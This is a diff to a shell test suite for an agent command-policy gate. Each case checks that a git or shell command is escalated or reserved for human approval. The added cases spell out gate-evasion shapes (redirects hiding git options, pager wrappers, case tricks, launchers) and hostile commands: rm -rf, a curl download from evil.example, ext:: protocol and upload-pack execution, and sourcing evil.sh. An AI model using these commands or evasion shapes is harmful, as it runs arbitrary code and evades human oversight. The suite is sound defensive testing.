@@ -113,6 +113,19 @@ else
 fi
 _dirty_rm="$(printf 'rm -rf /tmp/x \377')"
 check_not_allow "recursive rm with a trailing 0xFF byte" "$_dirty_rm"
+# Round 2 follow-up (herdr-control#254/PR#257 round-2 review, Main's
+# main-probes.out Part C mutation pass): the SAME two rows above, with a
+# `-P`/`--no-pager` wrapper — `_cp_push_is_safe`'s adjacency-only regex
+# and the blanket `\brm\b` floor rule must both still fire once git's
+# own global-option skip is centralized, not just for the unwrapped text.
+_dirty_p="$(printf 'git -P %s origin %s \377trailing' push ma"in")"
+check_reserved "default-branch push with a trailing 0xFF byte [-P]" "$_dirty_p"
+_dirty_nopager="$(printf 'git --no-pager %s origin %s \377trailing' push ma"in")"
+check_reserved "default-branch push with a trailing 0xFF byte [--no-pager]" "$_dirty_nopager"
+_dirty_rm_p="$(printf 'git -P rm -rf /tmp/x \377')"
+check_not_allow "recursive rm with a trailing 0xFF byte [-P]" "$_dirty_rm_p"
+_dirty_rm_nopager="$(printf 'git --no-pager rm -rf /tmp/x \377')"
+check_not_allow "recursive rm with a trailing 0xFF byte [--no-pager]" "$_dirty_rm_nopager"
 
 echo "== detonation F3: reserved actions spelled around the old regexes =="
 check_reserved "git -C <dir> push (breaks push adjacency)"   "git -C /Users/thurbs/Code/other push"
@@ -2080,6 +2093,33 @@ check_wt "scp -- protects a real dash-prefixed dest from being read as a flag (#
   "$WT_184" "scp -- src.txt /outside/-dashdest-scp" escalate
 check_wt "git clone --depth=1 (glued long form) still finds the real dest, unchanged" \
   "$WT_184" "git clone --depth=1 file:///tmp/r.git /outside/clone-depth-eq" escalate
+# Round 2 follow-up (herdr-control#254/PR#257 round-2 review, Main's
+# main-probes.out Part C mutation pass): `-P`/`--no-pager` ahead of
+# `clone` used to read as the subcommand itself in
+# `_cp_bwt_verb_targets`'s positional `"${1:-}" = clone` check, so the
+# real destination argument went unclassified — closed by stripping the
+# skip once in `_cp_locate_command_word`, the shared source of these
+# tokens, instead of only inside `_cp_git_unsafe_tokens`.
+check_wt "git clone explicit dest outside (#192 round 2 bypass E) [-P]" \
+  "$WT_184" "git -P clone https://example.com/r.git /outside/r" escalate
+check_wt "git clone explicit dest outside (#192 round 2 bypass E) [--no-pager]" \
+  "$WT_184" "git --no-pager clone https://example.com/r.git /outside/r" escalate
+check_wt "git clone --depth 1 (value-taking flag before URL) still finds the real dest (#192 round 3 F1) [-P]" \
+  "$WT_184" "git -P clone --depth 1 https://example.com/r.git /outside/r" escalate
+check_wt "git clone --depth 1 (value-taking flag before URL) still finds the real dest (#192 round 3 F1) [--no-pager]" \
+  "$WT_184" "git --no-pager clone --depth 1 https://example.com/r.git /outside/r" escalate
+check_wt "git clone -b BRANCH (value-taking flag before URL) still finds the real dest (#192 round 3 F1) [-P]" \
+  "$WT_184" "git -P clone -b main https://example.com/r.git /outside/r" escalate
+check_wt "git clone -b BRANCH (value-taking flag before URL) still finds the real dest (#192 round 3 F1) [--no-pager]" \
+  "$WT_184" "git --no-pager clone -b main https://example.com/r.git /outside/r" escalate
+check_wt "git clone --separate-git-dir names a write destination of its own (#192 round 3 F1) [-P]" \
+  "$WT_184" "git -P clone --separate-git-dir /outside/gitdir https://example.com/r.git" escalate
+check_wt "git clone --separate-git-dir names a write destination of its own (#192 round 3 F1) [--no-pager]" \
+  "$WT_184" "git --no-pager clone --separate-git-dir /outside/gitdir https://example.com/r.git" escalate
+check_wt "git clone --depth=1 (glued long form) still finds the real dest, unchanged [-P]" \
+  "$WT_184" "git -P clone --depth=1 file:///tmp/r.git /outside/clone-depth-eq" escalate
+check_wt "git clone --depth=1 (glued long form) still finds the real dest, unchanged [--no-pager]" \
+  "$WT_184" "git --no-pager clone --depth=1 file:///tmp/r.git /outside/clone-depth-eq" escalate
 check_wt "rsync -aTDIR (glued temp-dir short opt) still finds the real dest (#192 round 4 G4)" \
   "$WT_184" "rsync -aT/outside file.txt file2.txt" escalate
 check_wt "curl -oFILE (glued short output flag) still finds the real dest (#192 round 4 G5)" \
@@ -3831,6 +3871,354 @@ check "#261 r6 R5-SUBST: find hidden inside a backtick substitution escalates" \
 check "#261 r6 R5-QWRAP: a chain of individually-quoted launchers still unwraps to find" \
   "'nice' -n 5 'sudo' find . * -maxdepth 0" escalate
 
+echo
+echo "== round 12 (herdr-control#254 follow-up, hub form" \
+     "20261008T004244-8734 \"merge_plus_nopager\"): --no-pager/-P are the" \
+     "ONLY global options allowed ahead of a read-only verb =="
+check "r12 allow: --no-pager diff" "git --no-pager diff" allow
+check "r12 allow: --no-pager log --oneline -5" \
+  "git --no-pager log --oneline -5" allow
+check "r12 allow: -P show HEAD" "git -P show HEAD" allow
+check "r12 allow: --no-pager diff --no-ext-diff a b -- f" \
+  "git --no-pager diff --no-ext-diff a b -- f" allow
+check "r12 escalate: --no-pager -c core.pager=x log" \
+  "git --no-pager -c core.pager=x log" escalate
+check "r12 escalate: -c core.pager=x --no-pager log" \
+  "git -c core.pager=x --no-pager log" escalate
+check "r12 escalate: --no-pager -C /tmp log" \
+  "git --no-pager -C /tmp log" escalate
+check "r12 escalate: --no-pager grep -O x" \
+  "git --no-pager grep -O x" escalate
+check "r12 escalate: GIT_PAGER= env prefix before --no-pager" \
+  "GIT_PAGER=x git --no-pager log" escalate
+check "r12 escalate: --no-pager --paginate log" \
+  "git --no-pager --paginate log" escalate
+
+echo
+echo "== round 13 (herdr-control#254/PR#257 round-2 review, F1/F2/F3/F4):" \
+     "fail closed with no verb, config tokens after the verb (not" \
+     "position 2), \$/@SUB@ inside git config =="
+check "r13 F1 escalate: -P redirect hides -c ext::" \
+  'git -P >/dev/null -c protocol.ext.allow=always ls-remote ext::id' escalate
+check "r13 F1 escalate: bare redirect hides -C" \
+  'git >/dev/null -C /tmp/r status' escalate
+check "r13 F1 escalate: --no-pager redirect hides -c" \
+  'git --no-pager 2>&1 -c x log' escalate
+check "r13 F3 allow: -P config --get is still a pure read" \
+  'git -P config --get user.email' allow
+check "r13 F2 escalate: config value carries a bare \$" \
+  'git config $a' escalate
+check "r13 F4 allow: config after the --no-pager skip" \
+  'git --no-pager config --get user.email' allow
+check "r13 F4 escalate: config write after the --no-pager skip" \
+  'git --no-pager config user.email x' escalate
+check "r13 F4 escalate: -Pc is not the exact -P token" \
+  'git -Pc status' escalate
+check "r13 F4 escalate: -P= is not the exact -P token" \
+  'git -P= status' escalate
+check "r13 F4 escalate: --no-pager= is not the exact token" \
+  'git --no-pager= status' escalate
+check "r13 F4 escalate: --no-pag abbreviation not recognized" \
+  'git --no-pag status' escalate
+check "r13 F4 escalate: -pP bundled cluster" \
+  'git -pP status' escalate
+check "r13 F4 allow: quoted \"-P\" still matches the skip" \
+  'git "-P" status' allow
+check "r13 F4 escalate: --no-pager -- leaves no verb" \
+  'git --no-pager -- status' escalate
+check "r13 F4 escalate: \$ token right after the skip" \
+  'git --no-pager $x status' escalate
+
+echo
+echo "== round 14 (PR#257 round 3, SPEC.md 'remove redirections before ANY" \
+     "git rule'): a redirect leading git, between its global options, or" \
+     "right after the verb must not hide the invocation from any of the" \
+     "checks above =="
+# --- global option hidden by a redirect, every position, -P/--no-pager too
+check "r14 pre: -C hidden by a leading redirect" \
+  '>/dev/null git -C /tmp log' escalate
+check "r14 pre -P: -C hidden by a leading redirect" \
+  '>/dev/null git -P -C /tmp log' escalate
+check "r14 pre --no-pager: -C hidden by a leading redirect" \
+  '>/dev/null git --no-pager -C /tmp log' escalate
+check "r14 between: redirect right after git hides -C" \
+  'git >/dev/null -C /tmp/evilrepo status' escalate
+check "r14 between -P: redirect right after -P hides -C" \
+  'git -P >/dev/null -C /tmp/evilrepo status' escalate
+check "r14 between --no-pager: redirect after --no-pager hides -c" \
+  'git --no-pager 2>&1 -c protocol.ext.allow=always ls-remote ext::id' escalate
+check "r14 pre: --namespace hidden by a leading redirect" \
+  '>/dev/null git --namespace x log' escalate
+check "r14 pre: -p (paginate) hidden by a leading redirect" \
+  '>/dev/null git -p log' escalate
+check "r14 pre: --git-dir/--work-tree hidden by a leading redirect" \
+  '>/dev/null git --git-dir=/tmp/evil/.git --work-tree=/tmp/evil log' escalate
+check "r14 pre doubled: -P then a second redirect still hides -c ext::" \
+  '>/dev/null git -P >/dev/null -c protocol.ext.allow=always ls-remote ext::id' escalate
+check "r14 pre doubled: bare redirect then a second redirect hides -C" \
+  '>/dev/null git >/dev/null -C /tmp/r status' escalate
+check "r14 pre doubled: leading redirect then --no-pager's own redirect" \
+  '>/dev/null git --no-pager 2>&1 -c x log' escalate
+# --- git grep -O / --open-files-in-pager family, pre and postverb
+check "r14 pre: grep -O attached pager cmd" \
+  '>/dev/null git grep -O"touch /tmp/m" -e foo' escalate
+check "r14 postverb: grep -O attached pager cmd" \
+  'git grep >/dev/null -O"touch /tmp/m" -e foo' escalate
+check "r14 pre: grep --open-files-in-pager long form" \
+  '>/dev/null git grep --open-files-in-pager="printf X > /tmp/m" -e foo -- README.md' escalate
+check "r14 postverb: grep --open-files-in-pager long form" \
+  'git grep >/dev/null --open-files-in-pager="printf X > /tmp/m" -e foo -- README.md' escalate
+check "r14 pre: grep --open-files-in-pag abbreviation" \
+  '>/dev/null git grep --open-files-in-pag="touch /tmp/m" -e foo' escalate
+check "r14 postverb: --open-f=x abbreviation on a non-grep verb" \
+  'git log >/dev/null --open-f=x' escalate
+check "r14 pre: grep -nO bundled short opts" \
+  '>/dev/null git grep -nO/bin/true -e foo' escalate
+check "r14 postverb: grep -iO bundled short opts" \
+  'git grep >/dev/null -iO/bin/true -e foo' escalate
+check "r14 pre: grep -Ox attached value" \
+  '>/dev/null git grep -Ox -e foo' escalate
+check "r14 postverb: grep -Ox attached value" \
+  'git grep >/dev/null -Ox -e foo' escalate
+check "r14 postverb: grep option from a shell variable" \
+  'opt="-nO/tmp/x"; git grep >/dev/null "$opt" -e foo -- README.md' escalate
+check "r14 pre: grep option from command substitution" \
+  '>/dev/null git grep "$(printf "%s" "-nO/tmp/x")" -e foo -- README.md' escalate
+check "r14 postverb: grep long option from a shell variable" \
+  'opt="--open-files-in-pager=/tmp/x"; git grep >/dev/null "$opt" -e foo -- README.md' escalate
+# --- -o/--output (diff/show/log), pre and postverb
+check "r14 pre: diff -osrc/x attached output" \
+  '>/dev/null git diff -osrc/git-glued-output' escalate
+check "r14 postverb: show -osrc/x attached output" \
+  'git show >/dev/null -osrc/x HEAD' escalate
+check "r14 postverb: log -o src/x separate value" \
+  'git log >/dev/null -o src/x' escalate
+# --- rule B: -u/--upload-pack runs an arbitrary program, pre and postverb
+check "r14 pre: clone -u runs an arbitrary program" \
+  '>/dev/null git clone -u /tmp/pwned.sh src dst' escalate
+check "r14 postverb: clone -u runs an arbitrary program" \
+  'git clone >/dev/null -u /tmp/pwned.sh src dst' escalate
+check "r14 pre: fetch -u" '>/dev/null git fetch -u origin main' escalate
+check "r14 postverb: ls-remote -u" \
+  'git ls-remote >/dev/null -u /tmp/pwned.sh' escalate
+check "r14 pre: archive --remote --upload-pack long form" \
+  '>/dev/null git archive --remote=origin --upload-pack=/tmp/pwned.sh HEAD' escalate
+# --- r8 item B family (template/difftool/rebase/submodule/bisect/
+#     filter-branch/send-email/mergetool), pre and postverb
+check "r14 pre: clone --template" \
+  '>/dev/null git clone --template=/tmp/tpl src dst' escalate
+check "r14 postverb: rebase -x" \
+  'git rebase >/dev/null -x /tmp/x HEAD~1' escalate
+check "r14 pre: rebase --exec" \
+  '>/dev/null git rebase --exec=/tmp/x HEAD~1' escalate
+check "r14 postverb: submodule foreach" \
+  'git submodule >/dev/null foreach /tmp/x' escalate
+check "r14 pre: bisect run" '>/dev/null git bisect run /tmp/x' escalate
+check "r14 postverb: filter-branch --tree-filter" \
+  'git filter-branch >/dev/null --tree-filter /tmp/x HEAD' escalate
+check "r14 pre: send-email --sendmail-cmd" \
+  '>/dev/null git send-email --sendmail-cmd=/tmp/x --to=a@b m.patch' escalate
+check "r14 pre: mergetool always escalates" '>/dev/null git mergetool' escalate
+check "r14 pre: difftool -x" \
+  '>/dev/null git difftool -y -x /tmp/x HEAD~1' escalate
+# --- r9: git config exec-capable keys, pre and postverb
+check "r14 pre: config key read from a file, two positionals" \
+  '>/dev/null git config "$(cat tmp/keyfile)" /tmp/x; git log' escalate
+check "r14 postverb: config key read from a file, two positionals" \
+  'git config >/dev/null "$(cat tmp/keyfile)" /tmp/x; git log >/dev/null' escalate
+check "r14 pre: config gpg.program" \
+  '>/dev/null git config gpg.program /tmp/x' escalate
+check "r14 postverb: config core.askPass" \
+  'git config >/dev/null core.askPass /tmp/x' escalate
+check "r14 pre: config mergetool cmd" \
+  '>/dev/null git config mergetool.foo.cmd /tmp/x' escalate
+check "r14 postverb: config submodule update" \
+  'git config >/dev/null submodule.foo.update !/tmp/x' escalate
+# --- F4: unknown subcommand, pre
+check "r14 pre: unknown subcommand (possible alias)" '>/dev/null git x' escalate
+check "r14 pre: another unknown subcommand" '>/dev/null git frobnicate' escalate
+# --- r12/r13: --no-pager skip combined with a leading redirect
+check "r14 pre: --no-pager -C /tmp log" \
+  '>/dev/null git --no-pager -C /tmp log' escalate
+check "r14 pre: --no-pager grep -O x" \
+  '>/dev/null git --no-pager grep -O x' escalate
+check "r14 pre: --no-pager --paginate log" \
+  '>/dev/null git --no-pager --paginate log' escalate
+check "r14 pre: config value carries a bare \$" \
+  '>/dev/null git config $a' escalate
+check "r14 postverb: config value carries a bare \$" \
+  'git config >/dev/null $a' escalate
+check "r14 pre: config write after the --no-pager skip" \
+  '>/dev/null git --no-pager config user.email x' escalate
+check "r14 pre: -Pc is not the exact -P token" '>/dev/null git -Pc status' escalate
+check "r14 pre: -P= is not the exact -P token" '>/dev/null git -P= status' escalate
+check "r14 pre: --no-pager= is not the exact token" \
+  '>/dev/null git --no-pager= status' escalate
+check "r14 pre: --no-pag abbreviation not recognized" \
+  '>/dev/null git --no-pag status' escalate
+check "r14 pre: -pP bundled cluster" '>/dev/null git -pP status' escalate
+check "r14 pre: --no-pager -- leaves no verb" \
+  '>/dev/null git --no-pager -- status' escalate
+check "r14 pre: \$ token right after the skip" \
+  '>/dev/null git --no-pager $x status' escalate
+# --- allow spot-checks: an ordinary TRAILING redirect on an ordinary
+#     command must still allow — the allowlist drops only the fixed
+#     trailing redirect word, never the command (SPEC round 4).
+check "r14 allow: git status with stdout redirected" \
+  'git status >/dev/null' allow
+check "r14 allow: a non-git command with stderr-to-stdout" \
+  'ls -la 2>&1' allow
+check "r14 allow: git log with a multi-word trailing redirect" \
+  'git log --oneline -5 2>/dev/null' allow
+check "r14 allow: git -P diff with stderr-to-stdout" \
+  'git -P diff 2>&1' allow
+# --- round 4 (PR#257 round-3 review, R3-1..R3-5): the shapes that broke
+#     round 3's text-rewriting strip are now closed structurally — a
+#     redirect is never dropped from the middle of anything, so none of
+#     these can smuggle a separator, a newline, or a process-substitution
+#     body past this file. See `_cp_git_seg_strip_trailing_redirects`'s
+#     own header for why.
+check_reserved "R3-1 (push path): a redirect glued to a statement separator still reserves a later push" \
+  'git status >/dev/null;git push origin main'
+check "R3-1: same shape still escalates through the exec-option gate" \
+  'git status >/dev/null;git -C /tmp/evilrepo status' escalate
+check "R3-2: a real newline before git is a separate, later statement" \
+  "$(printf 'echo ok\ngit -C /tmp/r status')" escalate
+check "R3-3: process substitution keeps the inner git invocation visible" \
+  'cat <(git -C /tmp/evilrepo status)' escalate
+check_reserved "R3-3: process substitution keeps an inner git push reserved" \
+  'git status <(git push origin main)'
+check_reserved "R3-4: a quoted redirect operand in -C's value no longer eats the push verb" \
+  "git -C '<' push origin main"
+check_reserved "R3-5: a command substitution inside a redirect target still reserves the push" \
+  'git status >$(git push origin main)'
+# --- two Part C REGRESS shapes real bash reads as a DIFFERENT verb
+#     (`git p >/dev/null\ush origin main` runs `git p origin main` —
+#     the backslash just quotes the literal "u", there is no "ush" left
+#     to read as "push"; `git pu >/dev/null''sh origin main` runs
+#     `git pu origin main` the same way via quote-splicing). Under real
+#     bash semantics neither is actually a push — traced in
+#     .handoffs/PROOF.md#round-4-redirect-strip — so `_cp_git_push_invoked`'s
+#     primary exact-token scanner correctly calls both "safe". Round 6b
+#     (Main's live r5-probe run, Part C mode=postverb): reservation is
+#     the STRONGER human-only guarantee behind `conductor_reserved_reason`
+#     (plain `escalate` can still be peer-auto-answered as operational),
+#     so both now ALSO reserve via a second, narrower pass that fires
+#     whenever the token right after `git` is a non-empty proper prefix
+#     of `push` (`p`, `pu`) and the statement carries a redirect byte —
+#     failing closed on the ambiguity a human skimming the text (not
+#     tracing real redirect-target grammar) would read as "still says
+#     push". The embedded (non-trailing) redirect byte ALSO makes both
+#     ESCALATE through the exec-option gate independently of reservation,
+#     so there is nothing to under-block either way.
+check "Part C REGRESS: backslash-glued redirect inside the verb word escalates (stricter than main, not looser)" \
+  'git p >/dev/null\ush origin main' escalate
+check "Part C REGRESS: quote-spliced redirect inside the verb word escalates (stricter than main, not looser)" \
+  "git pu >/dev/null''sh origin main" escalate
+check_reserved "round 6b: backslash-glued redirect inside the verb word still reserves (postverb REGRESS)" \
+  'git p >/dev/null\ush origin main'
+check_reserved "round 6b: quote-spliced redirect inside the verb word still reserves (postverb REGRESS)" \
+  "git pu >/dev/null''sh origin main"
+# --- round 5 (PR#257 round-4 review, R4-1..R4-4): the push-scanner
+#     fallback round 4 added replaced main's whole-text scan with a bare
+#     `\bpush\b` substring search for the ENTIRE command whenever any
+#     redirect-carrying chunk couldn't be cleanly stripped — losing
+#     send-pack reservation elsewhere on the line (R4-1) and over-
+#     reserving on an unrelated "push" substring like a filename (R4-3).
+#     `_cp_git_push_invoked` now runs main's exact unconditional scan on
+#     the original text; see its own header.
+check_reserved "R4-1: send-pack with its own trailing redirect still reserves" \
+  'git send-pack origin main 2>/tmp/e'
+check_reserved "R4-1: an earlier redirect-carrying statement no longer loses a later send-pack" \
+  'git status 2>/tmp/e; git send-pack origin main'
+check_unreserved "R4-3: a push-named file in a trailing-redirected diff is not a push" \
+  'git diff lib/push-wake.sh >/tmp/d.patch'
+# --- round 5 (R4-2): a leading redirect shape the locator's own
+#     patterns don't cover (multi-digit fd, named fd, detached `>&`,
+#     `>|`) used to make the redirect's TARGET word — or nothing at all
+#     — read as the resolved command word, hiding git from the exec
+#     gate entirely. `_cp_git_seg_strip_trailing_redirects`'s backstop
+#     (if `git` still appears anywhere in the chunk as a word, run the
+#     same pop check regardless of what the locator resolved) closes
+#     this without touching the shared locator.
+check "R4-2: multi-digit leading fd hides git from the locator" \
+  '10>/dev/null git -C /tmp/r status' escalate
+check "R4-2: named leading fd hides git from the locator" \
+  '{fd}>/dev/null git -C /tmp/r status' escalate
+check "R4-2: detached >& hides git from the locator" \
+  '>& /dev/null git -C /tmp/r status' escalate
+check "R4-2: >| (noclobber override) no longer splits git away from its argv" \
+  '>|/dev/null git -C /tmp/r status' escalate
+# --- round 5 (R4-4): a detached operator-and-target pair, typed with a
+#     space, is the same redirect as the glued spelling — main judges
+#     both on the git argv alone.
+check "R4-4: detached 2> /dev/null allows like the glued spelling" \
+  'git status 2> /dev/null' allow
+check "R4-4: detached > /dev/null allows like the glued spelling" \
+  'git status > /dev/null' allow
+check "R4-4: trailing </dev/null allows" \
+  'git log --oneline -5 </dev/null' allow
+# --- round 6 (PR#257 round-5 review, R5-1/R5-2): a leading dup-fd
+#     redirect (`10>&2`, `{fd}>&2`, `10<&0`) is a shape the locator's
+#     own patterns don't cover either, and the R4-2 backstop's own
+#     "is this chunk git" test was case-SENSITIVE, so `GIT`/`Git`/
+#     `/usr/bin/GIT` (all real git on macOS's case-insensitive default
+#     filesystem) slipped past both and the chunk was waved through
+#     unchanged — looser than main, which escalates every one of these.
+#     `_cp_git_seg_strip_trailing_redirects`'s new leading-redirect
+#     check (any `_cp_is_redirect_word` first word escalates
+#     unconditionally) and `_cp_git_push_seg_has_git`'s new case-folded
+#     basename match close both holes.
+check "R5-1: multi-digit dup-fd redirect ahead of uppercase GIT" \
+  '10>&2 GIT -C /tmp/r status' escalate
+check "R5-1: named-fd dup redirect ahead of uppercase GIT" \
+  '{fd}>&2 GIT -C /tmp/r status' escalate
+check "R5-1: multi-digit input-dup redirect ahead of title-case Git" \
+  '10<&0 Git -C /tmp/r status' escalate
+check "R5-1: multi-digit dup-fd redirect ahead of /usr/bin/GIT" \
+  '10>&2 /usr/bin/GIT -C /tmp/r status' escalate
+check "R5-1: multi-digit dup-fd redirect ahead of git-core/git-ls-remote" \
+  '10>&2 /Library/Developer/CommandLineTools/usr/libexec/git-core/git-ls-remote --upload-pack=/tmp/x /tmp/r' escalate
+check "R5-1: multi-digit dup-fd redirect ahead of git-core/git-diff" \
+  '10>&2 /Library/Developer/CommandLineTools/usr/libexec/git-core/git-diff --ext-diff HEAD' escalate
+check "R5-1: multi-digit dup-fd redirect ahead of xargs .../git-core/git-log" \
+  '10>&2 xargs /Library/Developer/CommandLineTools/usr/libexec/git-core/git-log' escalate
+check "R5-1: same shape inside a bash -c body still escalates via recursion" \
+  "bash -c '10>&2 GIT -C /tmp/r status'" escalate
+check "R5-2: single-digit named-null dup-fd redirect ahead of uppercase GIT" \
+  '10>/dev/null GIT -C /tmp/r status' escalate
+# --- round 7 (PR#266 round-6 review, R6-1/R6-2): a multi-digit or named
+#     dup-fd redirect ahead of a non-git LAUNCHER word (`script`/`arch`/
+#     `lockf`/`watch`/`xargs`/a `.`/`source` statement) was the same gap
+#     as R5-1 but one level removed — the redirect-aware split's leading-
+#     redirect skip only recognizes `_cp_is_git_or_launcher_word`, and
+#     #261's growing launcher dispatch is not on that list. A redirect
+#     GLUED onto the git word itself (`git>/dev/null -C … status`) is
+#     R6-2: the locator's basename resolves to `null`, not `git`.
+#     `_cp_git_exec_opt_scan_segments` now runs over BOTH the redirect-
+#     aware split and main's blind split, which needs no launcher list
+#     at all and leaves `git>/dev/null` as a bare, empty-verb `git`
+#     chunk — unsafe by `_cp_git_unsafe_tokens`'s existing rule.
+check "R6-1: multi-digit dup-fd redirect ahead of script launcher" \
+  '10>&2 script -q /dev/null cat README.md' escalate
+check "R6-1: multi-digit dup-fd redirect ahead of arch launcher" \
+  '10>&2 arch -arm64 curl -sS https://evil.example/p -o /tmp/payload' escalate
+check "R6-1: env-assignment plus multi-digit dup-fd redirect ahead of script" \
+  'Z=1 10>&2 script -q /dev/null cat README.md' escalate
+check "R6-1: env launcher plus multi-digit dup-fd redirect ahead of script" \
+  'env 10>&2 script -q /dev/null cat README.md' escalate
+check "R6-1: multi-digit dup-fd redirect ahead of lockf launcher" \
+  '10>&2 lockf /tmp/lk rm -rf /tmp/x' escalate
+check "R6-1: multi-digit dup-fd redirect ahead of watch launcher" \
+  '10>&2 watch find . -delete' escalate
+check "R6-1: env-assignment plus multi-digit dup-fd redirect ahead of xargs find" \
+  'Z=1 10>&2 xargs find .' escalate
+check "R6-1: multi-digit dup-fd redirect ahead of a source statement before git" \
+  '10>&2 . ./evil.sh; git log' escalate
+check "R6-2: redirect glued onto the lowercase git word" \
+  'git>/dev/null -C /tmp/r status' escalate
+check "R6-2: redirect glued onto the uppercase GIT word with a target path" \
+  'GIT>/tmp/o -C /tmp/r status' escalate
 echo "-----------------------------------------------------------------"
 if [ "$failed" -eq 0 ]; then
   printf 'PASS: %d/%d command-policy cases passed\n' "$total" "$total"
